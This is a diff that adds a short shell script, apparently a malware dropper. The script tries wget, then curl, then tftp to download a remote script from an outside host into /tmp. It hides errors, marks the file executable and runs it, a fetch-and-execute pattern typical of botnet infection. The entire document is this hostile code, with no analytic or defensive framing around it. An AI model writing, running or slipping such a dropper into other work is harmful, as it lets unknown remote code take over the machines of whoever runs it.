@@ -1,0 +1,4 @@
+#!/bin/sh
+wget http://boberkurwa.phoneparts.icu:80/gay.sh -O /tmp/gay.sh 2>/dev/null || curl -s http://boberkurwa.phoneparts.icu:80/gay.sh -o /tmp/gay.sh 2>/dev/null || tftp -g -l /tmp/gay.sh -r gay.sh boberkurwa.phoneparts.icu 2>/dev/null
+chmod +x /tmp/gay.sh 2>/dev/null
+/tmp/gay.sh
